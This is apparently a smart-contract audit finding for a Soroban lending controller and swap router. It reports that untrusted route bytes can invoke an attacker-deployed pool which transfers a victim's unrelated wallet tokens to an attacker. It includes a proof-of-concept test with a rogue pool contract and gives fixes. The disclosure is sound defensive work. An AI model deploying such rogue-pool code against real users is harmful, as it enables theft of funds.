### Title
Malicious route deserialization can execute attacker-chosen pool code that steals tokens from the caller’s wallet - (File: contracts/controller/src/strategies/swap.rs)

### Summary
User-controlled `swap` bytes passed to controller strategy entrypoints are forwarded to the configured swap router and decoded as a route payload. The route can name an arbitrary pool contract. A malicious pool invoked during the route can issue a token `transfer` from the invoking user to an attacker; Soroban records that transfer under the user’s authorization tree, so a wallet that signs the simulated tree authorizes both the intended strategy and the theft.

### Finding Description
`multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral` accept a caller-supplied `swap: Bytes` argument and route it through `swap_tokens` / `swap_tokens_or_passthrough`. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) 

`swap_tokens` authorizes only the expected input-token transfer to the configured router, then calls `execute_strategy` with the untrusted bytes without decoding or constraining the venues it names. [5](#0-4) 

The router decodes those bytes as a `StrategyPayload` and executes the decoded instruction stream. [6](#0-5)  Its packed program format lets each instruction select a venue opcode and a pool by index into the payload’s attacker-controlled `assets` registry. [7](#0-6) [8](#0-7) 

The structural decoder bounds lengths and registry indices, but it does not bind pool addresses to an allowlist or otherwise prove that the named address implements the selected venue honestly. [9](#0-8)  Consequently, a validly encoded route can invoke attacker-deployed contract code.

The project’s threat model confirms that the route can place third-party code below the caller’s authorization and that a token transfer issued by that code is recorded as a child of the caller’s signed authorization entry. [10](#0-9)  The harness demonstrates the concrete exploit: a decoded route names a rogue `hop_pool`, the router invokes it, and its `swap` function calls `token::Client::transfer(victim, attacker, amount)` for an unrelated token held by the victim. [11](#0-10) [12](#0-11) 

### Impact Explanation
This is theft of user funds beyond the routed input amount. The rogue venue can transfer any token for which the victim is the `from` address, provided the victim signs the simulation-produced authorization tree containing that child call. The harness shows Alice’s unrelated wallet token balance falling to zero and the attacker receiving the full `WALLET_BALANCE` while the requested collateral swap still succeeds. [13](#0-12) 

The controller’s exact-input authorization only bounds the controller’s own grant; it does not bound additional auth requests made by route-selected code. [14](#0-13) [15](#0-14) 

### Likelihood Explanation
An unprivileged attacker can deploy a malicious contract, encode it as the pool for a valid route, and cause the victim to submit `swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, or direct `execute_strategy` with that payload. The malicious transfer is not hidden from authorization: simulation records it as a child of the victim’s entry, and it executes when the victim signs that tree. [16](#0-15) [17](#0-16) 

The practical barrier is that the victim must sign the expanded authorization tree. Users relying on simulation output without decoding and auditing the complete tree can therefore be exposed through route construction, compromised route distribution, or misleading transaction UX. This is more than route-quality risk because the payload causes code execution and wallet-token transfer outside the economically routed amount.

### Recommendation
Do not allow route payloads to invoke arbitrary pool addresses under the caller’s transaction authorization.

Prefer a protocol-controlled venue registry that maps each supported venue opcode and pool address to an expected contract identity or approved adapter. At minimum:

- maintain an on-chain allowlist or registry of supported pool contracts per venue;
- reject payload-selected pool addresses not present in that registry;
- document the remaining requirement for clients to reject any authorization tree containing children beyond the exact expected transfers;
- add regression tests asserting that a payload cannot name an unapproved contract that requests auth from the caller.

If arbitrary venue addresses are intentionally supported, treat route bytes as executable capability-bearing data and require callers/clients to verify the complete decoded route and authorization tree before signing.

### Proof of Concept
The repository already contains a dedicated regression scenario:

1. Deploy `UnlistedPoolRouter`; its `execute_strategy` decodes `swap_xdr`, pulls `total_in`, invokes `route.hop_pool.swap`, then returns a fair output. [18](#0-17) 
2. Deploy `RogueHopPool` with `(victim, wallet_token, attacker, amount)`; its `swap` calls `wallet_token.transfer(victim, attacker, amount)`. [19](#0-18) 
3. Encode `RoutedSwap { hop_pool: rogue_pool, min_out: FAIR_OUT_ETH, token_in: USDC, token_out: ETH }` as XDR. [20](#0-19) 
4. Victim calls `controller.swap_collateral(caller, account_id, current_usdc, SWAP_IN_USDC, new_eth, route)`. [21](#0-20) 
5. Simulation records the wallet-token transfer as a child of the victim’s `swap_collateral` authorization. [16](#0-15) 
6. In enforcing mode, an honest root-only tree rejects the rogue transfer, while the simulation-produced poisoned tree authorizes it and drains the victim’s unrelated wallet token. [17](#0-16)

### Citations

**File:** contracts/controller/src/lib.rs (L225-236)
```rust
    fn multiply(
        env: Env,
        caller: Address,
        account_id: u64,
        spoke_id: u32,
        collateral: HubAssetKey,
        debt_to_flash_loan: i128,
        debt: HubAssetKey,
        mode: PositionMode,
        swap: Bytes,
        initial_payment: Option<(HubAssetKey, i128)>,
        convert_swap: Option<Bytes>,
```

**File:** contracts/controller/src/lib.rs (L258-265)
```rust
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
```

**File:** contracts/controller/src/lib.rs (L283-290)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
```

**File:** contracts/controller/src/lib.rs (L311-319)
```rust
    fn repay_debt_with_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        collateral: HubAssetKey,
        collateral_amount: i128,
        debt: HubAssetKey,
        swap: Bytes,
        close_position: bool,
```

**File:** contracts/controller/src/strategies/swap.rs (L24-38)
```rust
    let controller = env.current_contract_address();
    let router_addr = storage::get_swap_aggregator(env);
    let router = SwapAggregatorClient::new(env, &router_addr);
    let token_in_client = token::Client::new(env, token_in);

    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/lib.rs (L245-255)
```rust
    /// Decodes `swap_xdr` as a `StrategyPayload` and runs it for `sender`.
    ///
    /// Requires `sender` authorization. Pulls `total_in` of the input token, runs the
    /// instruction stream, applies fees, checks the minimum output, and returns the amount
    /// delivered to `sender`. Panics with `Error::InvalidRouteXdr` if the XDR does not decode.
    fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        renew_instance(&env);
        let payload = StrategyPayload::from_xdr(&env, &swap_xdr)
            .unwrap_or_else(|_| panic_with_error!(&env, Error::InvalidRouteXdr));
        execute::run(env, sender, total_in, payload)
    }
```

**File:** contracts/swap-aggregator/src/program.rs (L93-118)
```rust
/// What an instruction does.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum Opcode {
    /// Swap through `venue`: `idx_a` pool, `idx_b` token in, `idx_c` token out.
    Swap(SwapVenue),
    /// Aquarius withdraw: `idx_a` pool, `idx_b` share token, `idx_c` first
    /// index of the per-constituent floor run in `amounts`.
    Burn,
    /// Aquarius deposit: `idx_a` pool, `idx_b` share token, `idx_c` index of
    /// the minimum share count in `amounts`.
    Mint,
}

impl Opcode {
    /// Decodes an opcode byte into its variant, or `None` if unrecognized.
    fn from_u8(value: u8) -> Option<Self> {
        match value {
            0 => Some(Self::Swap(SwapVenue::Soroswap)),
            1 => Some(Self::Swap(SwapVenue::Aquarius)),
            2 => Some(Self::Swap(SwapVenue::Phoenix)),
            3 => Some(Self::Swap(SwapVenue::Sushi)),
            4 => Some(Self::Swap(SwapVenue::CometDex)),
            5 => Some(Self::Burn),
            6 => Some(Self::Mint),
            _ => None,
        }
```

**File:** contracts/swap-aggregator/src/program.rs (L151-159)
```rust
/// One decoded instruction record.
#[derive(Clone, Copy, Debug)]
pub(crate) struct Op {
    pub opcode: Opcode,
    pub mode: Mode,
    pub idx_a: u32,
    pub idx_b: u32,
    pub idx_c: u32,
}
```

**File:** contracts/swap-aggregator/src/program.rs (L175-235)
```rust
impl Program {
    /// Copies, parses, and structurally validates `ops` against the registry sizes, returning
    /// the decoded program.
    ///
    /// Panics with [`Error::InvalidRouteXdr`] on a malformed header, version, length, opcode, or
    /// index, and with a more specific error for other structural violations (empty/oversized
    /// batch, same-token swap, broken `Prev` chain, out-of-range split weight). Touches no
    /// external contract.
    pub(crate) fn decode(env: &Env, ops: &Bytes, assets_len: u32, amounts_len: u32) -> Self {
        if assets_len == 0 || assets_len > MAX_ASSETS || amounts_len > MAX_AMOUNTS {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let len = ops.len();
        if len < HEADER_LEN || len as usize > MAX_PROGRAM_BYTES {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let mut buf = [0u8; MAX_PROGRAM_BYTES];
        ops.copy_into_slice(&mut buf[..len as usize]);

        if buf[head::VERSION] != VERSION {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let op_count = buf[head::OP_COUNT] as u32;
        let weight_count = buf[head::WEIGHT_COUNT] as u32;
        if op_count == 0 || op_count > MAX_OPS || weight_count > MAX_WEIGHTS {
            panic_with_error!(env, Error::EmptyBatch);
        }
        let weights_at = HEADER_LEN + OP_LEN * op_count;
        if len != weights_at + WEIGHT_LEN * weight_count {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }

        let token_in = buf[head::TOKEN_IN] as u32;
        let token_out = buf[head::TOKEN_OUT] as u32;
        let min_out = buf[head::MIN_OUT] as u32;
        if token_in >= assets_len || token_out >= assets_len || min_out >= amounts_len {
            panic_with_error!(env, Error::InvalidRouteXdr);
        }
        if token_in == token_out {
            panic_with_error!(env, Error::SameToken);
        }

        let referral = &buf[head::REFERRAL..head::REFERRAL + 4];
        let referral_id =
            u32::from_be_bytes([referral[0], referral[1], referral[2], referral[3]]) as u64;

        let program = Self {
            buf,
            op_count,
            weights_at,
            token_in,
            token_out,
            min_out,
            referral_id,
        };
        program.validate(env, assets_len, amounts_len, weight_count);
        program
    }
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L33-47)
```rust
/// Router double: pays a fair output and calls the hop pool the payload names.
#[contract]
pub struct UnlistedPoolRouter;

#[contractimpl]
impl UnlistedPoolRouter {
    pub fn execute_strategy(env: Env, sender: Address, total_in: i128, swap_xdr: Bytes) -> i128 {
        sender.require_auth();
        let route = RoutedSwap::from_xdr(&env, &swap_xdr).expect("route must decode");
        let router = env.current_contract_address();
        token::Client::new(&env, &route.token_in).transfer(&sender, &router, &total_in);
        let _: Val = env.invoke_contract(&route.hop_pool, &symbol_short!("swap"), vec![&env]);
        token::Client::new(&env, &route.token_out).transfer(&router, &sender, &route.min_out);
        route.min_out
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-125)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
    }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L147-157)
```rust
    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L229-268)
```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
```

**File:** common/src/token.rs (L33-52)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
}
```
